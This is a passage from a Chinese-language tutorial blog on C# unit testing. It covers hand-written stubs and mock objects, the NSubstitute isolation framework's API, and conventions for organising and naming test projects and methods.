<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">EmailInfo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Body;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> To;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Subject;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EmailInfo</span>(<span class="params"><span class="keyword">string</span> to, <span class="keyword">string</span> subject, <span class="keyword">string</span> body</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>.To = to;</span><br><span class="line">        <span class="keyword">this</span>.Subject = subject;</span><br><span class="line">        <span class="keyword">this</span>.Body = body;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">bool</span> <span class="title">Equals</span>(<span class="params"><span class="keyword">object</span> obj</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        EmailInfo compared = obj <span class="keyword">as</span> EmailInfo;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> To == compared.To &amp;&amp; Subject == compared.Subject </span><br><span class="line">            &amp;&amp; Body == compared.Body;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<strong><em>Step3.</em></strong> 创建 FakeEmailService 模拟对象，改造 FakeWebService 为存根</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">FakeEmailService</span> : <span class="title">IEmailService</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> EmailInfo email = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SendEmail</span>(<span class="params">EmailInfo emailInfo</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>.email = emailInfo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">FakeWebService</span> : <span class="title">IWebService</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> Exception ToThrow;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">LogError</span>(<span class="params"><span class="keyword">string</span> message</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ToThrow != <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> ToThrow;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<strong><em>Step4.</em></strong> 改造 LogAnalyzer 类适配两个 Service</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LogAnalyzer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> IWebService webService;</span><br><span class="line">    <span class="keyword">private</span> IEmailService emailService;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LogAnalyzer</span>(<span class="params">IWebService webService, IEmailService emailService</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>.webService = webService;</span><br><span class="line">        <span class="keyword">this</span>.emailService = emailService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Analyze</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileName.Length &lt; <span class="number">8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                webService.LogError(<span class="keyword">string</span>.Format(<span class="string">"Filename too short : &#123;0&#125;"</span>, fileName));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                emailService.SendEmail(<span class="keyword">new</span> EmailInfo(<span class="string">"someone@qq.com"</span>, <span class="string">"can't log"</span>, ex.Message));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<strong><em>Step5.</em></strong> 编写测试代码，创建预期对象，并使用预期对象断言所有的属性</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Analyze_WebServiceThrows_SendsEmail</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FakeWebService stubService = <span class="keyword">new</span> FakeWebService();</span><br><span class="line">    stubService.ToThrow = <span class="keyword">new</span> Exception(<span class="string">"fake exception"</span>);</span><br><span class="line">    FakeEmailService mockEmail = <span class="keyword">new</span> FakeEmailService();</span><br><span class="line"></span><br><span class="line">    LogAnalyzer log = <span class="keyword">new</span> LogAnalyzer(stubService, mockEmail);</span><br><span class="line">    <span class="keyword">string</span> tooShortFileName = <span class="string">"abc.ext"</span>;</span><br><span class="line">    log.Analyze(tooShortFileName);</span><br><span class="line">    <span class="comment">// 创建预期对象</span></span><br><span class="line">    EmailInfo expectedEmail = <span class="keyword">new</span> EmailInfo(<span class="string">"someone@qq.com"</span>, <span class="string">"can't log"</span>, <span class="string">"fake exception"</span>);</span><br><span class="line">    <span class="comment">// 用预期对象同时断言所有属性</span></span><br><span class="line">    Assert.AreEqual(expectedEmail, mockEmail.email);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="381412-20160505012257294-1492790520.jpg" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>&emsp;&emsp;总结：每个测试应该只测试一件事情，<strong>测试中应该也最多只有一个模拟对象</strong>。一个测试只能指定工作单元三种最终结果中的一个，不然的话天下大乱。</p>
</blockquote>
<h2 id="隔离（模拟）框架"><a href="#隔离（模拟）框架" class="headerlink" title="隔离（模拟）框架"></a>隔离（模拟）框架</h2><h3 id="为何使用隔离框架"><a href="#为何使用隔离框架" class="headerlink" title="为何使用隔离框架"></a>为何使用隔离框架</h3><p>&emsp;&emsp;对于复杂的交互场景，可能手工编写模拟对象和存根就会变得很不方便，因此，我们可以借助隔离框架来帮我们在运行时自动生成存根和模拟对象。</p>
<blockquote>
<p>&emsp;&emsp;一个隔离框架是一套<strong>可编程的 API</strong>，使用这套 API 创建伪对象比手工编写容易得多，快得多，而且简洁得多。</p>
</blockquote>
<p>&emsp;&emsp;隔离框架的主要功能就在于帮我们生成<strong>动态伪对象</strong>，动态伪对象是运行时创建的任何存根或者模拟对象，它的创建不需要手工编写代码（硬编码）。</p>
<h3 id="关于-NSubstitute-隔离框架"><a href="#关于-NSubstitute-隔离框架" class="headerlink" title="关于 NSubstitute 隔离框架"></a>关于 NSubstitute 隔离框架</h3><p>&emsp;&emsp;Nsubstitute 是一个开源的框架，源码是 C# 实现的。你可以在这里获得它的源码：<a href="https://github.com/nsubstitute/NSubstitute" target="_blank" rel="noopener">https://github.com/nsubstitute/NSubstitute</a><br>&emsp;&emsp;NSubstitute 更注重替代（Substitute）概念。它的设计目标是提供一个优秀的测试替代的 .NET 模拟框架。它是一个模拟测试框架，用最简洁的语法，使得我们能够把更多的注意力放在测试工作，减轻我们的测试配置工作，以满足我们的测试需求，帮助完成测试工作。它提供最经常需要使用的测试功能，且易于使用，语句更符合自然语言，可读性更高。对于单元测试的新手或只专注于测试的开发人员，它具有简单、友好的语法，使用更少的 Lambda 表达式来编写完美的测试程序。<br>&emsp;&emsp;NSubstitute 采用的是 <strong>Arrange-Act-Assert</strong> 测试模式，你只需要告诉它应该如何工作，然后断言你所期望接收到的请求，就大功告成了。因为你有更重要的代码要编写，而不是去考虑是需要一个 Mock 还是一个 Stub。  </p>
<p>&emsp;&emsp;在 .NET 项目中，我们仍然可以通过 NuGet 来安装 NSubsititute：</p>
<figure class="image-box">
                <img src="381412-20160505231122451-1879638477.png" alt title class>
                <p></p>
            </figure>

<h3 id="使用-NSubstitute-模拟对象"><a href="#使用-NSubstitute-模拟对象" class="headerlink" title="使用 NSubstitute 模拟对象"></a>使用 NSubstitute 模拟对象</h3><p>&emsp;&emsp;NSub 是一个受限框架，它最适合为接口创建伪对象。我们继续以前的例子，来看下面一段代码，它是一个手写的伪对象 FakeLogger，它会检查日志调用是否正确执行。此处我们没有使用隔离框架。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">ILogger</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">LogError</span>(<span class="params"><span class="keyword">string</span> message</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">FakeLogger</span> : <span class="title">ILogger</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> LastError;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">LogError</span>(<span class="params"><span class="keyword">string</span> message</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        LastError = message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Analyze_TooShortFileName_CallLogger</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 创建伪对象</span></span><br><span class="line">    FakeLogger logger = <span class="keyword">new</span> FakeLogger();</span><br><span class="line">    MyLogAnalyzer analyzer = <span class="keyword">new</span> Chapter5.MyLogAnalyzer(logger);</span><br><span class="line">    analyzer.MinNameLength = <span class="number">6</span>;</span><br><span class="line">    analyzer.Analyze(<span class="string">"a.txt"</span>);</span><br><span class="line"></span><br><span class="line">    StringAssert.Contains(<span class="string">"too short"</span>, logger.LastError);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;现在我们看看如何使用 NSub 伪造一个对象，换句话说，之前我们手动写的 FakeLogger 在这里就不用再手动写了：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Analyze_TooShortFileName_CallLogger</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 创建模拟对象，用于测试结尾的断言</span></span><br><span class="line">    ILogger logger = Substitute.For&lt;ILogger&gt;();</span><br><span class="line">    MyLogAnalyzer analyzer = <span class="keyword">new</span> MyLogAnalyzer(logger);</span><br><span class="line">    analyzer.MinNameLength = <span class="number">6</span>;</span><br><span class="line">    analyzer.Analyze(<span class="string">"a.txt"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 NSub API 设置预期字符串</span></span><br><span class="line">    logger.Received().LogError(<span class="string">"Filename too short : a.txt"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是：<br>（1）<code>ILogger</code>接口自身并没有这个 Received 方法；<br>（2）NSub 命名空间提供了一个扩展方法 <code>Received</code>，这个方法可以断言在测试中调用了伪对象的某个方法；<br>（3）通过在 LogError() 前调用 Received()，其实是 NSub 在询问伪对象的这个方法是否调用过。</p>
<h3 id="使用-NSubstitute-模拟值"><a href="#使用-NSubstitute-模拟值" class="headerlink" title="使用 NSubstitute 模拟值"></a>使用 NSubstitute 模拟值</h3><p>&emsp;&emsp;如果接口的方法返回不为空，如何从实现接口的动态伪对象返回一个值呢？我们可以借助 NSub 强制方法返回一个值：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Returns_ByDefault_WorksForHardCodeArgument</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    IFileNameRules fakeRules = Substitute.For&lt;IFileNameRules&gt;();</span><br><span class="line">    <span class="comment">// 强制方法返回假值</span></span><br><span class="line">    fakeRules.IsValidLogFileName(<span class="string">"strict.txt"</span>).Returns(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    Assert.IsTrue(fakeRules.IsValidLogFileName(<span class="string">"strict.txt"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;如果我们不想关心方法的参数，即无论参数是什么，方法应该总是返回一个价值，这样的话测试会更容易维护，因此我们可以借助 NSub 的参数匹配器：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Returns_ByDefault_WorksForAnyArgument</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    IFileNameRules fakeRules = Substitute.For&lt;IFileNameRules&gt;();</span><br><span class="line">    <span class="comment">// 强制方法返回假值</span></span><br><span class="line">    fakeRules.IsValidLogFileName(Arg.Any&lt;<span class="keyword">string</span>&gt;()).Returns(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    Assert.IsTrue(fakeRules.IsValidLogFileName(<span class="string">"anything.txt"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<code>Arg.Any&lt;Type&gt;</code>称为参数匹配器，在隔离框架中被广泛使用，控制参数处理。  </p>
<p>&emsp;&emsp;如果我们需要模拟一个异常，也可以借助 NSub 来解决：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Returns_ArgAny_Throws</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    IFileNameRules fakeRules = Substitute.For&lt;IFileNameRules&gt;();</span><br><span class="line"></span><br><span class="line">    fakeRules.When(x =&gt; x.IsValidLogFileName(Arg.Any&lt;<span class="keyword">string</span>&gt;())).</span><br><span class="line">        Do(context =&gt; &#123; <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"fake exception"</span>); &#125;);</span><br><span class="line"></span><br><span class="line">    Assert.Throws&lt;Exception&gt;(() =&gt; fakeRules.IsValidLogFileName(<span class="string">"anything"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这里，使用了<code>Assert.Throws</code>验证被测试方法确实抛出了一个异常。<code>When</code>和<code>Do</code>两个方法顾名思义代表了什么时候发生了什么事，发生了事之后要触发其他什么事。需要注意的是，这里<code>When</code>方法必须使用 Lambda 表达式。</p>
<h3 id="同时使用模拟对象和存根-1"><a href="#同时使用模拟对象和存根-1" class="headerlink" title="同时使用模拟对象和存根"></a>同时使用模拟对象和存根</h3><p>&emsp;&emsp;这里我们在一个场景中结合使用两种类型的伪对象：一个用作存根，另一个用作模拟对象。  </p>
<p>&emsp;&emsp;继续前面的一个例子，LogAnalyzer 要使用一个 MailServer 类和一个 WebService 类，这次需求有变化：如果日志对象抛出异常，LogAnalyzer 需要通知 Web 服务，如下图所示：</p>
<figure class="image-box">
                <img src="381412-20160506010210216-737165389.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;我们需要确保的是：如果日志对象抛出异常，LogAnalyzer 会把这个问题通知 WebService。下面是被测试类的代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">IWebService</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Write</span>(<span class="params"><span class="keyword">string</span> message</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LogAnalyzerNew</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> ILogger _logger;</span><br><span class="line">    <span class="keyword">private</span> IWebService _webService;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LogAnalyzerNew</span>(<span class="params">ILogger logger, IWebService webService</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _logger = logger;</span><br><span class="line">        _webService = webService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> MinNameLength</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span>; <span class="keyword">set</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Analyze</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileName.Length &lt; MinNameLength)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                _logger.LogError(<span class="keyword">string</span>.Format(<span class="string">"Filename too short : &#123;0&#125;"</span>, fileName));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                _webService.Write(<span class="string">"Error From Logger : "</span> + ex.Message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;现在我们借助 NSubstitute 进行测试：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Analyze_LoggerThrows_CallsWebService</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> mockWebService = Substitute.For&lt;IWebService&gt;();</span><br><span class="line">    <span class="keyword">var</span> stubLogger = Substitute.For&lt;ILogger&gt;();</span><br><span class="line">    <span class="comment">// 无论输入什么都抛出异常</span></span><br><span class="line">    stubLogger.When(logger =&gt; logger.LogError(Arg.Any&lt;<span class="keyword">string</span>&gt;()))</span><br><span class="line">        .Do(info =&gt; &#123; <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"fake exception"</span>); &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> analyzer = <span class="keyword">new</span> LogAnalyzerNew(stubLogger, mockWebService);</span><br><span class="line">    analyzer.MinNameLength = <span class="number">10</span>;</span><br><span class="line">    analyzer.Analyze(<span class="string">"short.txt"</span>);</span><br><span class="line">    <span class="comment">//验证在测试中调用了 Web Service 的模拟对象，调用参数字符串包含 "fake exception"</span></span><br><span class="line">    mockWebService.Received().Write(Arg.Is&lt;<span class="keyword">string</span>&gt;(s =&gt; s.Contains(<span class="string">"fake exception"</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这里我们不需要手工实现伪对象，但是代码的可读性已经变差了，因为有一堆 Lambda 表达式，不过它也帮我们避免了在测试中使用方法名字符串。</p>
<figure class="image-box">
                <img src="381412-20160506010715826-1926304121.jpg" alt title class>
                <p></p>
            </figure>

<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>&emsp;&emsp;本篇我们学习了单元测试的核心技术：存根、模拟对象以及隔离框架。使用存根可以帮助我们破除依赖，模拟对象与存根的区别主要在于存根不会导致测试失败，而模拟对象则可以。要辨别你是否使用了存根，最简单的方法是：存根永远不会导致测试失败，测试总是对被测试类进行断言。使用隔离框架，测试代码会更加易读、易维护，重点是可以帮助我们节省不少时间编写模拟对象和存根。</p>
<h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><p>（1）Roy Osherove 著，金迎 译，《单元测试的艺术（第2版）》<br>（2）匠心十年，《<a href="http://www.cnblogs.com/gaochundong/archive/2013/05/22/nsubstitute_manual.html" target="_blank" rel="noopener">NSubsititue 完全手册</a>》<br>（3）张善友，《<a href="http://www.cnblogs.com/shanyou/p/3366428.html" target="_blank" rel="noopener">单元测试模拟框架：NSubstitute</a>》</p>
<hr>
<h1 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h1><p>&emsp;&emsp;上一篇我们学习单元测试和核心技术：存根、模拟对象和隔离框架，它们是我们进行高质量单元测试的技术基础。本篇会集中在管理和组织单元测试的技术，以及如何确保在真实项目中进行高质量的单元测试。</p>
<h2 id="测试层次和组织"><a href="#测试层次和组织" class="headerlink" title="测试层次和组织"></a>测试层次和组织</h2><h3 id="测试项目的两种目录结构"><a href="#测试项目的两种目录结构" class="headerlink" title="测试项目的两种目录结构"></a>测试项目的两种目录结构</h3><p>（1）集成测试和单元测试在同一个项目里，但放在不同的目录和命名空间里。基础类放在单独的文件夹里。</p>
<figure class="image-box">
                <img src="381412-20160507001732263-138691920.jpg" alt title class>
                <p></p>
            </figure>

<p>（2）集成测试和单元测试位于不同的项目中，有不同的命名空间。</p>
<figure class="image-box">
                <img src="381412-20160507001923732-1743773550.jpg" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>&emsp;&emsp;实践中推荐使用第二种目录结构，因为如果我们不把这两种测试分开，人们可能就不会经常地运行这些测试。既然测试都写好了，为什么人们不愿意按照需要运行它们呢？一个原因是：开发人员有可能懒得运行测试，或者没有实践运行测试。</p>
</blockquote>
<h3 id="构建绿色安全区"><a href="#构建绿色安全区" class="headerlink" title="构建绿色安全区"></a>构建绿色安全区</h3><p>&emsp;&emsp;将集成测试和单元测试分开放置，其实就给团队的开发人员构建了绿色安全区，这个区只包含单元测试。<br>&emsp;&emsp;因为集成测试的本质决定了它运行时间较长，开发人员很有可能每天运行多次单元测试，较少运行集成测试。</p>
<figure class="image-box">
                <img src="381412-20160507002810044-1117288723.jpg" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>&emsp;&emsp;单元测试全部通过至少可以使开发人员对代码质量比较有信心，专注于提高编码效率。而且我们应该将测试自动化，编写每日构建脚本，并借助持续集成工具帮助我们自动执行这些脚本。</p>
</blockquote>
<h3 id="将测试类映射到被测试代码"><a href="#将测试类映射到被测试代码" class="headerlink" title="将测试类映射到被测试代码"></a>将测试类映射到被测试代码</h3><p>（1）将测试映射到项目<br>&emsp;&emsp;创建一个测试项目，用被测试项目的名字加上后缀 .UnitTests 来命名。<br>&emsp;&emsp;例如：Manulife.MyLibrary → Manulife.MyLibrary.UnitTests 和 Manulife.MyLibrary.IntegrationTests，这种方法看起来简单直观，开发人员能够从项目名称找到对应的所有测试。  </p>
<p>（2）将测试映射到类<br>&emsp;&emsp;① 每个被测试类或者被测试工作单元对应一个测试类：LogAnalyzer → LogAnalyzer.UnitTests<br>&emsp;&emsp;② 每个功能对应一个测试类：有一个 LoginManager 类，测试方法为 ChangePassword（这个方法测试用例特别多，需要单独放在一个测试类里边） → 创建两个类 LoginManagerTests 和 LoginManagerTests-ChangePassword，前者只包含对 ChangePassword 方法的测试，后者包含该类其他所有测试。  </p>
<p>（3）将测试映射到具体的工作单元入口<br>&emsp;&emsp;测试方法的命名应该有意义，这样人们可以很容易地找到所有相关的测试方法。<br>&emsp;&emsp;这里，回归一下第一篇中提到的测试方法名称的规范，一般包含三个部分：<code>[UnitOfWorkName]_[ScenarioUnderTest]_[ExpectedBehavior]</code></p>
<ul>
<li><code>UnitOfWorkName</code>：被测试的方法、一组方法或者一组类</li>
<li><code>Scenario</code>：测试进行的假设条件，例如“登入失败”，“无效用户”或“密码正确”等</li>
<li><code>ExpectedBehavior</code>：在测试场景指定的条件下，你对被测试方法行为的预期　　</li>
</ul>
<p>&emsp;&emsp;示例：<em>IsValidFileName_BadExtension_ReturnsFalse<em>，</em>IsValidFileName_EmptyName_Throws</em> 等</p>
